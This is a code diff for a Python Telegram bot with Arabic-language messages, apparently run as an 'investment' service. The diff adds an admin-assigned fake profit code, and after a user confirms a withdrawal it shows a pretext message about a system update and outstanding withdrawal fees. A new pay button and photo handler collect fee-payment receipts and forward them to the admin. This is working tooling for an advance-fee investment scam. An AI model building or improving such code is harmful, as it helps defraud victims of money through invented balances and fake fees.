@@ -30,6 +30,7 @@ user_custom_data = {}
 custom_profits = {
     "354101": {"amount": "45,500", "assigned_user_id": None},
     "00554": {"amount": "45,500", "assigned_user_id": None},
+    "358556": {"amount": "45,500", "assigned_user_id": None},
     "189415": {"amount": "1500", "assigned_user_id": None}
 }
 USED_CODES = set()
@@ -63,7 +64,7 @@ async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
             "اكتب الأمر بهذا الشكل:\n"
             "`/setprofit <معرف_المستخدم> <المبلغ> <رقم_التحقق>`\n\n"
-            "مثال:\n`/setprofit 7004113433 45500 00554`",
+            "مثال:\n`/setprofit 7004113433 45500 358556`",
             parse_mode="Markdown"
         )
         return
@@ -118,6 +119,34 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown",
         reply_markup=ReplyKeyboardRemove()
     )
+
+# معالجة الصور (إيصالات دفع الرسوم المرفوعة من الزبون)
+async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_id = user.id
+    username = f"@{user.username}" if user.username else "بدون معرف"
+    
+    if not update.message.photo:
+        return
+
+    photo = update.message.photo[-1]
+
+    await update.message.reply_text(
+        "📸 **تم استلام صورة الوصل (الإيصال) بنجاح!**\n\n"
+        "جاري مراجعة وتأكيد عملية دفع الرسوم من قبل الإدارة. شكراً لك!",
+        parse_mode="Markdown"
+    )
+
+    admin_caption = (
+        "📥 **إيصال دفع رسوم سحب جديد تم رفعه من مستخدم!**\n\n"
+        f"👤 اسم المستثمر: {user.first_name}\n"
+        f"🆔 معرف المستخدم: `{user_id}`\n"
+        f"🔗 يوزر الحساب: {username}"
+    )
+    try:
+        await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=admin_caption, parse_mode="Markdown")
+    except Exception as e:
+        logger.error(f"فشل إرسال صورة إيصال الرسوم للأدمن: {e}")
 
 # معالجة الرسائل النصية
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -271,15 +300,29 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # الانتظار لمدة 60 ثانية
         await asyncio.sleep(60)
 
-        # إرسال الرسالة المطلوبة بعد انتهاء المهلة
+        # زر الدفع المطلوب تحته
+        keyboard = [
+            [InlineKeyboardButton("💳 دفع", callback_data="pay_fees")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        # إرسال الرسالة الجديدة المحدثة بالكامل مع زر دفع
         await query.edit_message_text(
-            "الرجاء دفع رسوم سحب",
+            "عذرًا لقد تم للتو تحديث نظام البيانات. يرجى العلم بأن هناك رسوم سحب مستحقة على حسابكم، ولإتمام عملية دفع الرسوم يرجى الضغط على زر \"دفع\" أدناه، ثم رفع صورة الوصل ليتم تأكيد السحب بنجاح",
+            reply_markup=reply_markup,
             parse_mode="Markdown"
         )
         
         await context.bot.send_message(
             chat_id=ADMIN_ID,
-            text=f"✅ تنبيه: قام المستخدم بتأكيد السحب وانتهت مهلة 60 ثانية (وطُلب منه دفع رسوم سحب)!\n\n• معرف المستخدم: `{user_id}`\n• اليوزر: {username}",
+            text=f"✅ تنبيه: قام المستخدم بتأكيد السحب وانتهت مهلة 60 ثانية (وظهرت له رسالة دفع الرسوم)!\n\n• معرف المستخدم: `{user_id}`\n• اليوزر: {username}",
+            parse_mode="Markdown"
+        )
+
+    elif data == "pay_fees":
+        await query.edit_message_text(
+            "💳 **دفع رسوم السحب:**\n\n"
+            "يرجى تحويل مبلغ الرسوم المطلوبة، ثم **إرسال صورة الوصل (Screenshot)** هنا في المحادثة ليتم تأكيد سحبك بنجاح.",
             parse_mode="Markdown"
         )
 
@@ -293,9 +336,10 @@ def main():
     app.add_handler(CommandHandler("codes", admin_get_codes))
     app.add_handler(CommandHandler("setprofit", set_profit))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بمهلة تحقق 60 ثانية والتنظيم الكامل...")
+    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بكامل الميزات ورسالة الرسوم المحدثة...")
     app.run_polling()
 
 if __name__ == "__main__":
